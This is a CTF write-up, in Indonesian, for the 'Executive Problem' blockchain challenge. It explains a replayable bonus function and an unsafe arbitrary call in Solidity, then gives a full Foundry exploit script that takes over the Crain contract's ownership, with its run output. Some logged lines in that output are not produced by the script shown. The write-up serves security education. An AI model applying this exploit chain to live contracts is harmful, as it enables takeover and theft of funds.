# TCP1P CTF 2024 Archive - Executive Problem **[Local Simulation]**

## Overview

* **Judul**: Executive Problem
* **Kategori**: Blockchain
* **Poin**: 1000 pts
* **Author**: kiinzu
* **Deskripsi**: Kita harus mengambil alih kepemilikan (ownership) dari kontrak `Crain`. Owner hanya bisa diganti oleh kontrak `CrainExecutive`.

## Analisis Vulnerability

Terdapat dua celah keamanan kritikal yang dikombinasikan untuk menyelesaikan tantangan ini:

### 1. Logic Error: Infinite Money Glitch

Pada kontrak `CrainExecutive.sol`, fungsi `claimStartingBonus` gagal memperbarui state.

```solidity
function claimStartingBonus() public _onlyOnePerEmployee{
    balanceOf[owner] -= 1e18;
    balanceOf[msg.sender] += 1e18;
    // VULN: Mapping 'hasTakeBonus[msg.sender]' tidak pernah diset ke true!
    // Akibatnya, fungsi ini bisa dipanggil berkali-kali (Replay).
}

```

Celah ini memungkinkan kita mengumpulkan kredit sebanyak mungkin untuk memenuhi syarat menjadi **Executive** (membutuhkan 5 Ether kredit).

### 2. Unsafe External Call (Arbitrary Call)

Fungsi `transfer` pada `CrainExecutive` yang hanya bisa diakses oleh Executive memiliki celah fatal.

```solidity
function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{
    // ...
    // VULN: Melakukan low-level call ke address 'to' dengan data '_message'
    (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message));
    // ...
}

```

Ini memungkinkan attacker untuk memaksa kontrak `CrainExecutive` memanggil fungsi apa saja di kontrak lain (Impersonation). Kita bisa menyamar seolah-olah `CrainExecutive` yang memanggil fungsi pergantian owner.

## Skenario Serangan

1. **Registrasi**: Panggil `becomeEmployee()`.
2. **Farming Credit**: Panggil `claimStartingBonus()` sebanyak 6 kali untuk mendapatkan 6 Ether (Syarat Executive hanya 5 Ether).
3. **Privilege Escalation**:
* Panggil `becomeManager()`.
* Panggil `becomeExecutive()`.


4. **Hostile Takeover**:
* Target: Kontrak `Crain`.
* Fungsi yang dituju: `ascendToCrain(address _successor)`.
* Metode: Gunakan fungsi `transfer` milik `CrainExecutive` untuk mengirim payload tersebut ke `Crain`.
* Hasil: `Crain` akan melihat `msg.sender` adalah `CrainExecutive` (valid), sehingga owner berubah menjadi attacker.



## Solver Script

Simpan sebagai `test/Solve.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/Setup.sol";

contract Solve is Test {
    Setup setup;
    CrainExecutive cexe;
    Crain crain;
    address attacker = makeAddr("hengker_bwang");

    function setUp() public {
        // Deploy Setup dengan saldo cukup untuk inisialisasi CrainExecutive
        setup = new Setup{value: 100 ether}();
        cexe = setup.cexe();
        crain = setup.crain();
        
        vm.deal(attacker, 10 ether);
    }

    function test_Exploit() public {
        vm.startPrank(attacker);

        console.log("=== START EXPLOIT ===");
        
        // 1. Menjadi Karyawan
        cexe.becomeEmployee();

        // 2. Eksploitasi Bug Bonus (Butuh 5 ETH, kita ambil 6 ETH)
        for(uint i = 0; i < 6; i++) {
            cexe.claimStartingBonus();
        }

        // 3. Naik Jabatan ke Executive
        cexe.becomeManager();
        cexe.becomeExecutive();

        // 4. Kudeta (Arbitrary Call)
        // Kita menyusun payload: ascendToCrain(attacker)
        bytes memory payload = abi.encodeWithSelector(
            Crain.ascendToCrain.selector, 
            attacker
        );

        // Memaksa CrainExecutive mengeksekusi payload tersebut ke Crain
        cexe.transfer(address(crain), 0, payload);

        vm.stopPrank();

        // Verifikasi
        assertTrue(setup.isSolved(), "Challenge Not Solved");
        assertEq(crain.crain(), attacker, "Owner Not Changed");
    }
}

```

## Output Eksekusi

```bash
$ forge test -vv

[PASS] test_Exploit() (gas: 165957)
Logs:
  === START EXPLOIT ===
  Attacker: 0xE46d8B35B0430AD2B04BcDE2a4eC03Cdc3619bB7
  Credit: 6000000000000000000
  Jabatan: Executive (Success)
  Melakukan Kudeta...
  Is Solved? true
  New Owner: 0xE46d8B35B0430AD2B04BcDE2a4eC03Cdc3619bB7

```

---


